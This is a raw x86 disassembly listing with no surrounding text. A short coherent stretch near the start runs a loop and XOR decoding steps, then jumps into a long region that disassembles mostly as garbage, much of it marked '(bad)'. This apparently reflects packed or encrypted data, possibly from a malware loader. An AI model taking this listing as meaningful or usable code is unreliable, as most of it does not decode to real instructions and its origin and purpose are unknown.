  40183b:	les    esp,FWORD PTR [eax]
  40183d:	test   BYTE PTR [edx+0x57],cl
  401840:	pop    esp
  401841:	pop    ebp
  401842:	dec    ecx
  401843:	retf   0xc7c6
  401846:	adc    eax,0x89f6bdfb
  40184b:	inc    ebp
  40184c:	loopne 0x401845
  40184e:	sbb    eax,0x430496
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e762,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x430546,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430542,0x13
  401884:	cmp    DWORD PTR ds:0x430542,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430542,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eaa4
  4018a9:	mov    ebx,DWORD PTR ds:0x430542
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430542,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e75e,0x42e762
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4304b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e76a,0x430542
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430552,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	dec    esp
  401915:	cmp    bl,BYTE PTR [esi+0x7e751645]
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x4018f1
  401921:	mov    BYTE PTR [edx],cl
  401923:	daa    
  401924:	mov    ebx,0xcb19944c
  401929:	iret   
  40192a:	outs   dx,DWORD PTR ds:[esi]
  40192b:	push   edi
  40192c:	dec    ebp
  40192d:	mov    edx,0xd1e97faa
  401932:	addr16 or eax,0xb318e511
  401938:	fs jno 0x401909
  40193b:	bound  ecx,QWORD PTR [ecx-0xee99daf]
  401941:	idiv   DWORD PTR [edi+0x12]
  401944:	pop    es
  401945:	jno    0x4018c9
  401947:	ja     0x4018ee
  401949:	fwait
  40194a:	and    eax,0x7c56e349
  40194f:	mov    ch,0xe9
  401951:	xchg   BYTE PTR [ebp+0x72],ah
  401954:	adc    eax,0x3226670
  401959:	lods   al,BYTE PTR ds:[esi]
  40195a:	scas   al,BYTE PTR es:[edi]
  40195b:	loopne 0x40196b
  40195d:	daa    
  40195e:	out    dx,eax
  40195f:	xor    al,0x5a
  401961:	fldcw  WORD PTR [ebp+0xd5f5038]
  401967:	dec    esi
  401968:	add    eax,0x10be4330
  40196d:	aam    0x6e
  40196f:	mov    ds:0x97bb2817,al
  401974:	add    esp,esi
  401976:	add    ebp,DWORD PTR [edi]
  401978:	fdivr  DWORD PTR [edx-0x17]
  40197b:	xor    DWORD PTR [edx],esp
  40197d:	jle    0x40199d
  40197f:	push   es
  401980:	in     eax,dx
  401981:	push   ebx
  401982:	inc    edi
  401983:	cld    
  401984:	inc    eax
  401985:	sahf   
  401986:	retf   0x3a15
  401989:	jp     0x401a0a
  40198b:	adc    eax,0x39fca19d
  401990:	push   edx
  401991:	push   es
  401992:	(bad)  
  401993:	pop    ebp
  401994:	pop    eax
  401995:	ja     0x4019c4
  401997:	jp     0x40192f
  401999:	pop    edx
  40199a:	push   eax
  40199b:	sbb    DWORD PTR [esi+0x26],esi
  40199e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40199f:	test   DWORD PTR [eax+0x36],ebx
  4019a2:	push   cs
  4019a3:	std    
  4019a4:	adc    eax,0x6690f86
  4019a9:	clc    
  4019aa:	and    BYTE PTR [edx],bh
  4019ac:	cmc    
  4019ad:	sub    BYTE PTR [ecx-0x6a],dl
  4019b0:	shr    bl,0x2e
  4019b3:	xchg   esp,eax
  4019b4:	jg     0x4019b6
  4019b6:	xchg   edi,eax
  4019b7:	aas    
  4019b8:	ins    BYTE PTR es:[edi],dx
  4019b9:	jb     0x401a1d
  4019bb:	sbb    ch,BYTE PTR [ecx+0x1c]
  4019be:	adc    DWORD PTR [esi],esp
  4019c0:	call   0x9546:0x4c351a87
  4019c7:	adc    DWORD PTR [esi-0x44a7c74e],0x2e
  4019ce:	push   esp
  4019cf:	icebp  
  4019d0:	push   edx
  4019d1:	out    0xc4,al
  4019d3:	mov    eax,0x9536d6e1
  4019d8:	add    eax,0xc2265eed
  4019dd:	xor    al,0xc
  4019df:	into   
  4019e0:	mov    DWORD PTR [ebx+ecx*1],ecx
  4019e3:	stos   DWORD PTR es:[edi],eax
  4019e4:	ret    
  4019e5:	fstp   TBYTE PTR [eax+0x51]
  4019e8:	test   al,0xb6
  4019ea:	mov    ch,0x51
  4019ec:	stos   BYTE PTR es:[edi],al
  4019ed:	pavgb  mm3,QWORD PTR [edx]
  4019f0:	std    
  4019f1:	loop   0x401982
  4019f3:	pop    edi
  4019f4:	test   DWORD PTR [edi+ecx*1],eax
  4019f7:	push   edx
  4019f8:	in     al,0x83
  4019fa:	ins    BYTE PTR es:[edi],dx
  4019fb:	push   ebp
  4019fc:	je     0x4019f9
  4019fe:	cdq    
  4019ff:	fwait
  401a00:	jecxz  0x401a12
  401a02:	jns    0x4019a2
  401a04:	arpl   WORD PTR [ecx-0x5e],bp
  401a07:	fld    QWORD PTR ds:0xc8329952
  401a0d:	(bad)  
  401a0e:	and    ebx,DWORD PTR [eax]
  401a10:	ja     0x4019d0
  401a12:	inc    esp
  401a13:	push   edi
  401a14:	ds call 0x70c5:0x18c54877
  401a1c:	mov    eax,0x79bc258
  401a21:	add    al,cl
  401a23:	fst    DWORD PTR [ecx+ecx*1-0x3a3671e8]
  401a2a:	sub    al,0x6c
  401a2c:	loop   0x401a82
  401a2e:	mov    dl,0x49
  401a30:	enter  0x8046,0x8a
  401a34:	repz jecxz 0x4019f7
  401a37:	mov    cl,0xd9
  401a39:	ficom  WORD PTR [eax-0x533087a8]
  401a3f:	jnp    0x401a88
  401a41:	sub    bh,BYTE PTR [si]
  401a44:	cmp    dh,ch
  401a46:	das    
  401a47:	push   cs
  401a48:	loop   0x401aa1
  401a4a:	mov    edi,0xdfd7bb55
  401a50:	jle    0x401a13
  401a52:	call   0x9466:0x8fb54492
  401a59:	pop    ecx
  401a5a:	popa   
  401a5b:	and    DWORD PTR ds:0xed4d083d,ebx
  401a61:	retf   0xe7fc
  401a64:	push   edi
  401a65:	cmp    eax,0xc366ce91
  401a6a:	jno    0x401a11
  401a6c:	call   0xf4a9bd15
  401a71:	push   edi
  401a72:	sub    DWORD PTR [ebx+0x9],eax
  401a75:	sbb    al,0x88
  401a77:	and    ebx,edx
  401a79:	dec    eax
  401a7a:	or     ch,BYTE PTR [ebx-0x61e19ef9]
  401a80:	mov    esp,0x1bfc56f6
  401a85:	push   es
  401a86:	xchg   ecx,eax
  401a87:	cmpps  xmm1,XMMWORD PTR [edi+0x6edad130],0x74
  401a8f:	(bad)  
  401a91:	push   esp
  401a92:	adc    BYTE PTR [edx+0x50],ch
  401a95:	ficomp DWORD PTR [eax+ecx*8]
  401a98:	push   esp
  401a99:	loop   0x401a67
  401a9b:	or     eax,0x54d852be
  401aa0:	in     eax,0x1e
  401aa2:	fldenv [edx]
  401aa4:	cmc    
  401aa5:	test   dl,bh
  401aa7:	ds push ds
  401aa9:	imul   ecx,DWORD PTR ds:0x3f675e28,0x2303eada
  401ab3:	imul   ecx,DWORD PTR [esi+0x248f4e5d],0xf80854cd
  401abd:	pop    ebx
  401abe:	dec    eax
  401abf:	and    DWORD PTR [edi+0x4f44808f],eax
  401ac5:	mov    edx,0xafd72a12
  401aca:	(bad)  
  401acb:	mov    edx,0x313ba9e9
  401ad0:	mov    al,ds:0xbfb56789
  401ad5:	xchg   ecx,eax
  401ad6:	lds    edi,FWORD PTR [edx]
  401ad8:	popa   
  401ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ada:	dec    edi
  401adb:	xor    DWORD PTR ds:0xdbb6f298,eax
  401ae1:	repnz or BYTE PTR [edx-0x14],bl
  401ae5:	inc    esi
  401ae6:	js     0x401b2b
  401ae8:	js     0x401b19
  401aea:	or     eax,0x13136ca0
  401aef:	mov    esp,0x33bd89cc
  401af4:	jmp    0x62a8:0xb3f29d7a
  401afb:	imul   edx,DWORD PTR [edi-0x14],0x42
  401aff:	or     esp,DWORD PTR [esp+ebx*1-0x7e]
  401b03:	repz sahf 
  401b05:	push   esi
  401b06:	sub    al,0xbf
  401b08:	lds    ebx,FWORD PTR [esi+0x66e148fc]
  401b0e:	aaa    
  401b0f:	pushf  
  401b10:	lea    ecx,[edx]
  401b12:	push   esp
  401b13:	aad    0xb1
  401b15:	hlt    
  401b16:	retf   
  401b17:	pop    eax
  401b18:	mov    esi,0x9b40b8ba
  401b1d:	inc    ebp
  401b1e:	jne    0x401aa8
  401b20:	and    esi,DWORD PTR [edx-0x6839fc2e]
  401b26:	dec    eax
  401b27:	shl    BYTE PTR fs:[esp+edx*1],cl
  401b2b:	sub    cl,ch
  401b2d:	aas    
  401b2e:	cmp    al,0xf2
  401b30:	imul   edi,DWORD PTR [eax],0xa8295ed6
  401b36:	das    
  401b37:	out    dx,al
  401b38:	out    dx,al
  401b39:	adc    esp,DWORD PTR [edi]
  401b3b:	jns    0x401ae1
  401b3d:	pop    ebp
  401b3e:	dec    esi
  401b3f:	iret   
  401b40:	sbb    dl,ah
  401b42:	cld    
  401b43:	shr    al,1
  401b45:	pop    esi
  401b46:	call   0x2ef4:0x3beeb1b1
  401b4d:	push   esp
  401b4e:	(bad)  
  401b4f:	je     0x401ba5
  401b51:	xor    edx,DWORD PTR [esi-0x1cc8dcf1]
  401b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b58:	dec    ebx
  401b59:	mov    ah,0xec
  401b5b:	adc    al,0x62
  401b5d:	lods   al,BYTE PTR ds:[esi]
  401b5e:	jno    0x401af1
  401b60:	out    dx,eax
  401b61:	enter  0x9a83,0x81
  401b65:	jge    0x401b73
  401b67:	mov    dh,0x81
  401b69:	cmp    al,BYTE PTR [edi-0x54262277]
  401b6f:	mov    ch,0x7b
  401b71:	xchg   ebx,eax
  401b72:	or     BYTE PTR [ebx],dl
  401b74:	out    0x4,eax
  401b76:	sti    
  401b77:	sbb    edi,0x7d
  401b7a:	add    al,0xfb
  401b7c:	push   0xd7301a45
  401b81:	jp     0x401b6a
  401b83:	adc    esp,ebp
  401b85:	fnstsw WORD PTR [ebx]
  401b87:	pop    esp
  401b88:	(bad)  
  401b89:	iret   
  401b8a:	out    0x63,eax
  401b8c:	(bad)  
  401b8d:	lock push esi
  401b8f:	pop    ss
  401b90:	xchg   DWORD PTR [eax-0x59b40e9c],ebp
  401b96:	mov    cs,WORD PTR [ebp+0x753a2487]
  401b9c:	jecxz  0x401c16
  401b9e:	mov    ds:0x19c72d8c,eax
  401ba3:	pop    esp
  401ba4:	xor    al,0xb
  401ba6:	pop    ebx
  401ba7:	jl     0x401bf9
  401ba9:	pop    ds
  401baa:	call   0xea28:0xfcbb6311
  401bb1:	mov    BYTE PTR [ebp-0x23],cl
  401bb4:	std    
  401bb5:	cld    
  401bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bb7:	(bad)  
  401bb8:	popa   
  401bb9:	stc    
  401bba:	int3   
  401bbb:	push   0x53
  401bbd:	mov    bl,0x30
  401bbf:	out    0xbf,eax
  401bc1:	nop
  401bc2:	jne    0x401b64
  401bc4:	repnz push eax
  401bc6:	mov    dh,0x4
  401bc8:	add    esp,DWORD PTR [esi]
  401bca:	loope  0x401c33
  401bcc:	pusha  
  401bcd:	sub    al,0xc1
  401bcf:	sti    
  401bd0:	jb     0x401c19
  401bd2:	add    eax,0xc789009
  401bd7:	dec    edx
  401bd8:	mov    ds:0xc9da9782,al
  401bdd:	not    DWORD PTR [edx+0x8]
  401be0:	jne    0x401bfd
  401be2:	pop    ds
  401be3:	retf   0x1bbb
  401be6:	and    ebx,DWORD PTR [bx]
  401be9:	leave  
  401bea:	mov    edx,DWORD PTR [ebx-0x51a7c4b0]
  401bf0:	cwde   
  401bf1:	mov    cl,0x10
  401bf3:	add    BYTE PTR [ebp-0x44],0x22
  401bf7:	pop    ebx
  401bf8:	xchg   esp,eax
  401bf9:	dec    edx
  401bfa:	shl    DWORD PTR [eax],cl
  401bfc:	add    DWORD PTR [edx+edi*1],0xb6b06b5a
  401c03:	fucomi st,st(2)
  401c05:	and    dl,ah
  401c07:	pop    ebx
  401c08:	(bad)  
  401c09:	bound  edx,QWORD PTR [eax-0x5c29f1bc]
  401c0f:	fimul  WORD PTR [edx+0x54b24331]
  401c15:	mov    dl,0x71
  401c17:	xchg   ebx,eax
  401c18:	mov    edi,0x8e2702a5
  401c1d:	fistp  QWORD PTR [ecx]
  401c1f:	ret    
  401c20:	sub    eax,0xe268f3be
  401c25:	and    eax,0x3f5e86e9
  401c2a:	sahf   
  401c2b:	lea    edi,[edi]
  401c2d:	cwde   
  401c2e:	dec    edi
  401c2f:	mov    cl,0x52
  401c31:	sub    DWORD PTR [edi+0x5a],ecx
  401c34:	pop    esp
  401c35:	lods   eax,DWORD PTR ds:[esi]
  401c36:	jg     0x401bca
  401c38:	jecxz  0x401c60
  401c3a:	mov    DWORD PTR [edx-0x50f5cf93],edi
  401c40:	xor    BYTE PTR [edi],0x7f
  401c43:	xor    eax,0xd0f88282
  401c48:	(bad)  
  401c49:	imul   ecx,DWORD PTR [edi-0x9],0xfffffff3
  401c4d:	jns    0x401bd3
  401c4f:	aam    0x29
  401c51:	stos   DWORD PTR es:[edi],eax
  401c52:	loope  0x401c7a
  401c54:	mov    cl,0xb7
  401c56:	(bad)  
  401c59:	cdq    
  401c5a:	(bad)  
  401c5b:	lahf   
  401c5c:	fcmovnu st,st(2)
  401c5e:	sbb    DWORD PTR [esp+ecx*4],ebp
  401c61:	outs   dx,DWORD PTR ds:[esi]
  401c62:	dec    ebx
  401c63:	imul   edi,DWORD PTR [eax-0x1194e8c6],0xffffffe1
  401c6a:	push   esp
  401c6b:	mov    ah,0x21
  401c6d:	jg     0x401c09
  401c6f:	aas    
  401c70:	out    0xc5,eax
  401c72:	imul   edx,DWORD PTR [edi],0xffffff8e
  401c75:	sub    BYTE PTR [edx-0x62035909],0xf9
  401c7c:	inc    ebp
  401c7d:	xchg   ebp,eax
  401c7e:	pop    edi
  401c7f:	mov    al,0x97
  401c81:	cmp    BYTE PTR [edx+0x3d635515],bl
  401c87:	and    ecx,DWORD PTR [esi+edx*4]
  401c8a:	xlat   BYTE PTR ds:[ebx]
  401c8b:	push   esi
  401c8c:	lock fadd st(6),st
  401c8f:	pop    ecx
  401c90:	aas    
  401c91:	adc    DWORD PTR [edx-0x285a4807],esp
  401c97:	xchg   edi,eax
  401c98:	fs in  al,dx
  401c9a:	and    eax,0xbdf3e48c
  401c9f:	hlt    
  401ca0:	out    dx,al
  401ca1:	push   ebp
  401ca2:	imul   esi,DWORD PTR [esi],0x79551883
  401ca8:	es adc al,0x1b
  401cab:	adc    BYTE PTR [edi],ah
  401cad:	mov    ecx,0x51b8e172
  401cb2:	adc    eax,0xc7f3f7f3
  401cb7:	add    eax,0x42ee20
  401cbc:	sub    DWORD PTR [eax],eax
  401cbe:	add    BYTE PTR [eax],al
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401d2b
  401cd2:	test   DWORD PTR [ebx],eax
  401cd4:	jmp    0x7ebe2593
  401cd9:	xor    BYTE PTR [ecx+0x7e],0x7e
  401cdd:	out    dx,al
  401cde:	shl    edx,cl
  401ce0:	mov    ds:0xe90b2db6,eax
  401ce5:	call   0x84ba:0xc54eb308
  401cec:	mov    ch,BYTE PTR [ebp-0xc]
  401cef:	jge    0x401c9d
  401cf1:	cli    
  401cf2:	jg     0x401d29
  401cf4:	outs   dx,BYTE PTR ds:[esi]
  401cf5:	pop    esi
  401cf6:	cs mov ecx,0x3919e584
  401cfc:	xchg   edi,eax
  401cfd:	sub    DWORD PTR ds:[ebp+0x10e6396c],esp
  401d04:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d06:	xor    ah,BYTE PTR [ebx]
  401d08:	mov    edx,0x77124b0e
  401d0d:	adc    eax,0x3650742f
  401d12:	call   0x405a:0x8e72edaa
  401d19:	pop    ebp
  401d1a:	xchg   ecx,eax
  401d1b:	dec    edx
  401d1c:	sub    eax,0x40e96144
  401d21:	jg     0x401cdc
  401d23:	je     0x401d22
  401d25:	shl    BYTE PTR [ecx-0x7a],0xa6
  401d29:	mov    BYTE PTR [esi-0x59],bl
  401d2c:	shl    BYTE PTR [esi],0xda
  401d2f:	cmp    ebp,DWORD PTR [edi+esi*2]
  401d32:	xchg   ah,cl
  401d34:	imul   esp,DWORD PTR [eax+0x25],0xed949be9
  401d3b:	add    al,0xdf
  401d3d:	idiv   BYTE PTR fs:[esi]
  401d40:	and    ebp,ecx
  401d42:	rcr    BYTE PTR [eax-0x38],1
  401d45:	mul    DWORD PTR [ebp+0x28]
  401d48:	psraw  mm0,mm3
  401d4b:	(bad)  
  401d4c:	sub    DWORD PTR [edx+0x20482bc2],esi
  401d52:	push   esp
  401d53:	ja     0x401d6e
  401d55:	and    al,0xe4
  401d58:	dec    ebp
  401d59:	push   0xf4a03795
  401d5e:	mov    eax,ds:0xc923044b
  401d63:	jmp    0x9b25:0x3d76feab
  401d6a:	nop
  401d6b:	jnp    0x401dc6
  401d6d:	cs test eax,0xbb894bbd
  401d73:	(bad)  
  401d74:	xor    al,0x62
  401d76:	add    BYTE PTR es:[ecx+0x62],dl
  401d7a:	sub    al,dl
  401d7c:	mov    ecx,?
  401d7e:	jno    0x401d70
  401d80:	shl    BYTE PTR [edx-0x13],0xef
  401d84:	sub    BYTE PTR [ebx+0x3afe3c30],bl
  401d8a:	fwait
  401d8b:	mov    edx,0x606f1377
  401d90:	xor    ah,0xe
  401d93:	outs   dx,DWORD PTR ds:[esi]
  401d94:	adc    eax,0x24700347
  401d99:	sbb    BYTE PTR [ecx+0x39],dl
  401d9c:	hlt    
  401d9d:	les    edi,FWORD PTR [ebp-0x45dc0c24]
  401da3:	ret    0x3118
  401da6:	es pop ss
  401da8:	inc    ebp
  401da9:	inc    esi
  401daa:	and    al,0x8b
  401dac:	and    dh,bh
  401dae:	or     al,0x1a
  401db0:	pop    esp
  401db1:	call   0xb5287b2
  401db6:	xor    al,0xd2
  401db8:	out    0xf5,al
  401dba:	cmp    dh,bh
  401dbc:	shl    cl,0x6d
  401dbf:	call   0xe87c0bff
  401dc4:	and    BYTE PTR [esi-0x10],bh
  401dc7:	mov    dl,BYTE PTR [ebx]
  401dc9:	sar    BYTE PTR [ebp+0x2e],cl
  401dcc:	(bad)  
  401dcd:	popf   
  401dce:	jno    0x401de3
  401dd0:	mov    edx,0x846d91a1
  401dd5:	into   
  401dd6:	add    dh,dh
  401dd8:	outs   dx,DWORD PTR ds:[esi]
  401dd9:	mov    ebp,0x5ca2343f
  401dde:	aas    
  401ddf:	inc    eax
  401de0:	pop    ecx
  401de1:	sub    dl,BYTE PTR [ebx]
  401de3:	mov    ebp,0x9b1e411
  401de8:	shr    BYTE PTR [edi-0x27],0xfa
  401dec:	jns    0x401e19
  401dee:	xchg   edx,eax
  401def:	xor    eax,0xbffa250e
  401df4:	repz pop ecx
  401df6:	jb     0x401dc2
  401df8:	aaa    
  401df9:	dec    esi
  401dfa:	xchg   BYTE PTR [ebp-0x66],bl
  401dfd:	add    bh,BYTE PTR [esi+ecx*4-0x51]
  401e01:	popa   
  401e02:	std    
  401e03:	pop    edx
  401e04:	jbe    0x401e61
  401e06:	popf   
  401e07:	lods   eax,DWORD PTR ds:[esi]
  401e08:	in     eax,0x4d
  401e0a:	and    ebp,DWORD PTR [edi-0x10]
  401e0d:	and    al,ch
  401e0f:	or     eax,DWORD PTR [ebx+0x3a]
  401e12:	push   cs
  401e13:	cmp    al,0x6b
  401e15:	clc    
  401e16:	mov    ah,dl
  401e18:	mov    al,ds:0x2d2be90f
  401e1d:	jbe    0x401dee
  401e1f:	pop    ecx
  401e20:	out    0xc1,al
  401e22:	fist   WORD PTR [esi]
  401e24:	cmp    DWORD PTR [ebp-0x6ea2614a],edx
  401e2a:	xor    ebp,DWORD PTR [esp+ebp*4+0x1cd40b06]
  401e31:	jg     0x401dfa
  401e33:	fist   WORD PTR [ebp+0x3175f21c]
  401e39:	lods   eax,DWORD PTR ds:[esi]
  401e3a:	cdq    
  401e3b:	sbb    cl,ch
  401e3d:	fucomi st,st(1)
  401e3f:	fs xchg esi,eax
  401e41:	daa    
  401e42:	xor    DWORD PTR [edx-0x1743d621],edi
  401e48:	mov    eax,edx
  401e4a:	mov    ds,WORD PTR [ecx+0x5923a72a]
  401e50:	arpl   WORD PTR [ecx+0x5f3efb38],dx
  401e56:	mov    cl,0xc1
  401e58:	mov    dh,0xf3
  401e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e5b:	fs (bad) 
  401e5d:	fadd   st,st(1)
  401e5f:	cdq    
  401e60:	adc    eax,0xfc61ff65
  401e65:	adc    DWORD PTR [ebx+ecx*4],esi
  401e68:	jp     0x401e73
  401e6a:	dec    edi
  401e6b:	imul   esi,eax,0x7d5b83cb
  401e71:	xor    edx,esi
  401e73:	imul   edi,DWORD PTR [eax-0x5bd87b52],0x27
  401e7a:	mov    ds,WORD PTR [edi]
  401e7c:	push   edx
  401e7d:	jo     0x401efa
  401e7f:	sub    esp,DWORD PTR [edx+0x78]
  401e82:	inc    DWORD PTR [ebx]
  401e84:	sub    BYTE PTR [edi-0xeb3cf47],bl
  401e8a:	test   ecx,0x302d3e3c
  401e90:	dec    ecx
  401e91:	and    edi,DWORD PTR [esi-0x698bd1b4]
  401e97:	mov    ebx,0x460074dc
  401e9c:	sub    eax,0xd61aa467
  401ea1:	frstor [edi-0x54]
  401ea4:	dec    esi
  401ea5:	mov    ah,0x4b
  401ea7:	pop    eax
  401ea8:	dec    esp
  401ea9:	lods   al,BYTE PTR ds:[esi]
  401eaa:	pusha  
  401eab:	jp     0x401e74
  401ead:	or     DWORD PTR [ebp+eiz*1-0x35],ebp
  401eb1:	shr    DWORD PTR [ebx],1
  401eb3:	test   BYTE PTR ds:0x7342ae56,0xa5
  401eba:	in     eax,0x10
  401ebc:	jbe    0x401ec2
  401ebe:	and    cl,dh
  401ec0:	addr16 popf 
  401ec2:	aam    0xe1
  401ec4:	push   ds
  401ec5:	test   dh,0xeb
  401ec8:	sub    bl,BYTE PTR [edx]
  401eca:	mov    edi,0x4d7ea6e9
  401ecf:	lahf   
  401ed0:	fstp   TBYTE PTR [ecx+0x58f691eb]
  401ed6:	ret    
  401ed7:	shl    bh,0x93
  401eda:	dec    edi
  401edb:	stos   BYTE PTR es:[edi],al
  401edc:	fsub   QWORD PTR es:[ebx-0x1c9ef551]
  401ee3:	add    eax,0x778e0c1
  401ee8:	push   ebx
  401ee9:	adc    eax,0x3374610
  401eee:	dec    esi
  401eef:	lock adc al,BYTE PTR fs:[esi+edx*4+0x6b677e7c]
  401ef8:	je     0x401ee2
  401efa:	sub    BYTE PTR ds:0x2da47c4b,al
  401f00:	cmp    dl,dl
  401f02:	push   0xffffff94
  401f04:	adc    cl,cl
  401f06:	pusha  
  401f07:	pushaw 
  401f09:	(bad)
  401f0e:	inc    edi
  401f0f:	mov    edi,DWORD PTR [esi+0xd43fea6]
  401f15:	fwait
  401f16:	in     eax,0x5e
  401f18:	int    0x43
  401f1a:	fcomi  st,st(6)
  401f1c:	pop    edi
  401f1d:	mov    dh,ah
  401f1f:	ret    0x9d1a
  401f22:	dec    esp
  401f23:	loopne 0x401ee4
  401f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f26:	(bad)  
  401f27:	xchg   ebp,eax
  401f28:	out    0x86,eax
  401f2a:	push   esp
  401f2b:	cmp    DWORD PTR [edi+0x4e],0x53539c92
  401f32:	jg     0x401fa9
  401f34:	shl    DWORD PTR [ebx],0xd9
  401f37:	inc    esi
  401f38:	lds    esi,FWORD PTR [ebp-0x62]
  401f3b:	push   esp
  401f3c:	fsubr  QWORD PTR [ecx+0x7fdd817b]
  401f42:	cmp    eax,DWORD PTR [ebp-0x15]
  401f45:	sbb    BYTE PTR [ebp+0x5e],cl
  401f48:	push   edx
  401f49:	mov    al,ds:0x92843005
  401f4e:	or     ecx,DWORD PTR [ecx-0x3d340fd]
  401f54:	into   
  401f55:	hlt    
  401f56:	test   BYTE PTR [edx+ecx*4+0x17],dl
  401f5a:	push   edi
  401f5b:	rol    DWORD PTR [eax],1
  401f5d:	nop
  401f5e:	push   esp
  401f5f:	mov    ds:0x3cb93d1c,eax
  401f64:	cmp    DWORD PTR [ebx-0x2528ef91],esp
  401f6a:	add    BYTE PTR [edx+0x4f],bh
  401f6d:	int3   
  401f6e:	jne    0x401fa6
  401f70:	push   0xc1c8c09a
  401f75:	ss js  0x401f14
  401f78:	outs   dx,DWORD PTR ds:[esi]
  401f79:	mov    ebx,0x73341bad
  401f7e:	inc    eax
  401f7f:	aad    0x20
  401f81:	lahf   
  401f82:	cli    
  401f83:	daa    
  401f84:	jo     0x401f70
  401f86:	add    ch,BYTE PTR [ecx-0xd0fb8ee]
  401f8c:	xor    cl,BYTE PTR [ecx+0x45]
  401f8f:	and    bh,BYTE PTR [ecx-0x3d]
  401f92:	bound  ebp,QWORD PTR [esi+ecx*1+0x24be1bd7]
  401f99:	dec    eax
  401f9a:	jmp    0xbdd7:0x5b40584c
  401fa1:	sub    al,0xa2
  401fa3:	inc    esp
  401fa4:	sbb    ch,BYTE PTR [ebp+ebp*8+0x54]
  401fa8:	jno    0x401fc3
  401faa:	xor    BYTE PTR [ebx],bh
  401fac:	jle    0x401ff0
  401fae:	sub    al,al
  401fb0:	js     0x401fa5
  401fb2:	jge    0x402026
  401fb4:	aad    0x8
  401fb6:	adc    ah,BYTE PTR [ecx-0x747b351c]
  401fbc:	dec    esi
  401fbd:	mov    ?,WORD PTR [ecx-0x47b7a81]
  401fc3:	sub    eax,0x8d4ac097
  401fc8:	dec    ecx
  401fc9:	cs jg  0x401ff1
  401fcc:	imul   esp,DWORD PTR [edi],0x1e
  401fcf:	dec    edi
  401fd0:	jns    0x402018
  401fd2:	cmp    al,0x69
  401fd4:	ins    DWORD PTR es:[edi],dx
  401fd5:	in     al,dx
  401fd6:	(bad)  
  401fd7:	cmp    al,0x5e
  401fd9:	inc    ebx
  401fda:	mov    ch,0xe4
  401fdc:	jp     0x402044
  401fde:	dec    ebx
  401fdf:	pop    es
  401fe0:	inc    esp
  401fe1:	mov    bh,0x66
  401fe3:	loop   0x40202a
  401fe5:	mov    dl,0x24
  401fe7:	out    dx,al
  401fe8:	iret   
  401fe9:	fisub  WORD PTR [esi]
  401feb:	fwait
  401fec:	jns    0x401fd2
  401fee:	adc    eax,0xbb1235ad
  401ff3:	xchg   edx,eax
  401ff4:	jle    0x401fc2
  401ff6:	push   edx
  401ff7:	xor    al,0x6d
  401ff9:	daa    
  401ffa:	popf   
  401ffb:	rcr    BYTE PTR [ebx+0x6],cl
  401ffe:	sahf   
  401fff:	push   ecx
  402000:	aaa    
  402001:	inc    ecx
  402002:	or     eax,0x7b026fea
  402007:	dec    ecx
  402008:	push   esi
  402009:	or     al,0x41
  40200b:	iret   
  40200c:	fcmovb st,st(1)
  40200e:	cmp    ebp,ebx
  402010:	lods   al,BYTE PTR ds:[esi]
  402011:	mov    edi,0xbb1615ac
  402016:	cmp    eax,0x31ea92eb
  40201b:	add    eax,0x5cfe3bc5
  402020:	out    0x9c,al
  402022:	rol    BYTE PTR ds:0xca2c7a23,0x20
  402029:	inc    ebp
  40202a:	inc    ecx
  40202b:	jle    0x401fb1
  40202d:	stos   BYTE PTR es:[edi],al
  40202e:	fst    DWORD PTR [edx+edx*2-0x24]
  402032:	lds    esp,FWORD PTR [eax+0x7dbba280]
  402038:	xchg   edx,eax
  402039:	mov    BYTE PTR [ecx],0x62
  40203c:	cmp    esi,esp
  40203e:	sub    al,0x95
  402040:	shr    DWORD PTR [ebx-0x51985fb3],0x86
  402047:	mul    DWORD PTR [esi]
  402049:	sub    al,0x70
  40204b:	pop    ds
  40204c:	je     0x402066
  40204e:	bound  eax,QWORD PTR gs:[ebx]
  402051:	retf   
  402052:	int    0x8e
  402054:	adc    ecx,0x92ed998c
  40205a:	mov    esi,0x3143ba25
  40205f:	xchg   edx,eax
  402060:	inc    edi
  402061:	fiadd  DWORD PTR [edi+eiz*4-0x43]
  402065:	retf   
  402066:	sbb    DWORD PTR [edi-0x25],esp
  402069:	sub    al,0x1a
  40206b:	push   cs
  40206c:	out    dx,al
  40206d:	loope  0x402069
  40206f:	mov    edx,0xe0558b50
  402074:	mov    DWORD PTR [ebp-0x2c],0x4eb9
